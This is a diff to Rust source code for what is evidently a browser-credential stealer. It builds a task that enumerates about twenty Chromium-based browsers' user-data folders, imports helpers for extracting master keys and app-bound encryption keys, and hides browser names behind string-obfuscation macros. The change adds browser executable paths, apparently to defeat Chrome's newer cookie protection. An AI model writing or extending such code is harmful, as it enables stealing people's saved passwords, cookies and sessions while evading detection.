@@ -23,11 +23,11 @@ use tasks::{composite_task, CompositeTask, Task};
 use utils::browsers::chromium::{extract_app_bound_encrypted_key, extract_master_key};
 use utils::path::Path;
 
-pub struct ChromiumTask<'a> {
-    tasks: Vec<(ChromiumBasedBrowser<'a>, CompositeTask)>,
+pub struct ChromiumTask {
+    tasks: Vec<(ChromiumBasedBrowser, CompositeTask)>,
 }
 
-impl ChromiumTask<'_> {
+impl ChromiumTask {
     pub(crate) fn new() -> Self {
         let all_browsers = get_chromium_browsers();
         let mut tasks = vec![];
@@ -106,10 +106,10 @@ fn is_in_profile_folder(path: &Path) -> bool {
         .unwrap_or(false)
 }
 
-impl Task for ChromiumTask<'_> {
+impl Task for ChromiumTask {
     unsafe fn run(&self, parent: &Path) {
         for (browser, task) in &self.tasks {
-            let parent = parent / browser.name;
+            let parent = parent / &browser.name;
             unsafe { task.run(&parent) }
         }
     }
@@ -133,56 +133,173 @@ impl BrowserData {
     }
 }
 
-pub(super) struct ChromiumBasedBrowser<'a> {
-    name: &'a str,
+pub(super) struct ChromiumBasedBrowser {
+    name: String,
+    executable: Option<Path>,
     has_profiles: bool,
     user_data: Path
 }
 
 macro_rules! browser_without_profiles {
-    ($name:expr, $path:expr) => {
+    (
+        name: $name:expr,
+        executable: $executable:expr,
+        data: $path:expr
+    ) => {
         ChromiumBasedBrowser { 
-            name: $name, 
-            has_profiles: false, 
+            name: obfstr::obfstr!($name).to_owned(),
+            executable: Some($executable),
+            has_profiles: false,
+            user_data: $path
+        }
+    };
+    (
+        name: $name:expr,
+        data: $path:expr
+    ) => {
+        ChromiumBasedBrowser {
+            name: obfstr::obfstr!($name).to_owned(),
+            executable: None,
+            has_profiles: false,
             user_data: $path
         }
     };
 }
 macro_rules! browser {
-    ($name:expr, $path:expr) => {
+    (
+        name: $name:expr,
+        executable: $executable:expr,
+        data: $path:expr
+    ) => {
         ChromiumBasedBrowser { 
-            name: $name, 
+            name: obfstr::obfstr!($name).to_owned(),
+            executable: Some($executable),
             has_profiles: true, 
             user_data: $path
         }
     };
+    (
+        name: $name:expr,
+        data: $path:expr
+    ) => {{
+        ChromiumBasedBrowser {
+            name: obfstr::obfstr!($name).to_owned(),
+            executable: None,
+            has_profiles: true,
+            user_data: $path
+        }
+    }};
 }
 
-fn get_chromium_browsers<'a>() -> [ChromiumBasedBrowser<'a>; 20] {
+fn get_chromium_browsers() -> [ChromiumBasedBrowser; 20] {
     let local = Path::localappdata();
     let appdata = Path::appdata();
+    let program_files = Path::program_files();
+    let program_files_x86 = Path::program_files_x86();
     let user_data = s!("User Data").to_owned();
 
     [
-        browser!("Amingo",                    &local   / s!("Amingo")               / &user_data),
-        browser!("Torch",                     &local   / s!("Torch")                / &user_data),
-        browser!("Kometa",                    &local   / s!("Kometa")               / &user_data),
-        browser!("Orbitum",                   &local   / s!("Orbitum")              / &user_data),
-        browser!("Epic Private",              &local   / s!("Epic Privacy Browser") / &user_data),
-        browser!("Cent",                      &local   / s!("CentBrowser")          / &user_data),
-        browser!("Vivaldi",                   &local   / s!("Vivaldi")              / &user_data),
-        browser!("Chromium",                  &local   / s!("Chromium")             / &user_data),
-        browser!("Thorium",                   &local   / s!("Thorium")              / &user_data),
-        browser_without_profiles!("Opera",    &appdata / s!("Opera Software")       / s!("Opera Stable")),
-        browser_without_profiles!("Opera GX", &appdata / s!("Opera Software")       / s!("Opera GX Stable")),
-        browser!("7Star",                     &local   / s!("7Star")                / s!("7Star")         / &user_data),
-        browser!("Sputnik",                   &local   / s!("Sputnik")              / s!("Sputnik")       / &user_data),
-        browser!("Chrome SxS",                &local   / s!("Google")               / s!("Chrome SxS")    / &user_data),
-        browser!("Chrome",                    &local   / s!("Google")               / s!("Chrome")        / &user_data),
-        browser!("Edge",                      &local   / s!("Microsoft")            / s!("Edge")          / &user_data),
-        browser!("Uran",                      &local   / s!("uCozMedia")            / s!("Uran")          / &user_data),
-        browser!("Yandex",                    &local   / s!("Yandex")               / s!("YandexBrowser") / &user_data),
-        browser!("Brave",                     &local   / s!("BraveSoftware")        / s!("Brave-Browser") / &user_data),
-        browser!("Atom",                      &local   / s!("Mail.Ru")              / s!("Atom")          / &user_data),
+        browser!(
+            name: "Amingo",
+            data: &local / s!("Amingo") / &user_data
+        ),
+
+        browser!(
+            name: "Torch",
+            data: &local / s!("Torch") / &user_data
+        ),
+
+        browser!(
+            name: "Kometa",
+            data: &local / s!("Kometa") / &user_data
+        ),
+
+        browser!(
+            name: "Orbitum",
+            data: &local / s!("Orbitum") / &user_data
+        ),
+
+        browser!(
+            name: "Epic Private",
+            data: &local / s!("Epic Privacy Browser") / &user_data
+        ),
+
+        browser!(
+            name: "Cent",
+            data: &local / s!("CentBrowser") / &user_data
+        ),
+
+        browser!(
+            name: "Vivaldi",
+            data: &local / s!("Vivaldi") / &user_data
+        ),
+
+        browser!(
+            name: "Chromium",
+            executable: &program_files / s!("Google") / s!("Chrome") / s!("Application") / s!("chrome.exe"),
+            data: &local / s!("Chromium") / &user_data
+        ),
+
+        browser!(
+            name: "Thorium",
+            data: &local / s!("Thorium") / &user_data
+        ),
+
+        browser_without_profiles!(
+            name: "Opera",
+            data: &appdata / s!("Opera Software") / s!("Opera Stable")
+        ),
+
+        browser_without_profiles!(
+            name: "Opera GX",
+            data: &appdata / s!("Opera Software") / s!("Opera GX Stable")
+        ),
+
+        browser!(
+            name: "7Star",
+            data: &local / s!("7Star") / s!("7Star") / &user_data
+        ),
+
+        browser!(
+            name: "Sputnik",
+            data: &local / s!("Sputnik") / s!("Sputnik") / &user_data
+        ),
+
+        browser!(
+            name: "Chrome SxS",
+            data: &local / s!("Google") / s!("Chrome SxS") / &user_data
+        ),
+
+        browser!(
+            name: "Chrome",
+            data: &local / s!("Google") / s!("Chrome") / &user_data
+        ),
+
+        browser!(
+            name: "Edge",
+            executable: &program_files_x86 / s!("Microsoft") / s!("Edge") / s!("Application") / s!("msedge.exe"),
+            data: &local / s!("Microsoft") / s!("Edge") / &user_data
+        ),
+
+        browser!(
+            name: "Uran",
+            data: &local / s!("uCozMedia") / s!("Uran") / &user_data
+        ),
+
+        browser!(
+            name: "Yandex",
+            data: &local / s!("Yandex") / s!("YandexBrowser") / &user_data
+        ),
+
+        browser!(
+            name: "Brave",
+            executable: &program_files / s!("BraveSoftware") / s!("Brave-Browser") / s!("Application") / s!("Brave.exe"),
+            data: &local / s!("BraveSoftware") / s!("Brave-Browser") / &user_data
+        ),
+
+        browser!(
+            name: "Atom",
+            data: &local / s!("Mail.Ru") / s!("Atom") / &user_data
+        ),
     ]
 }
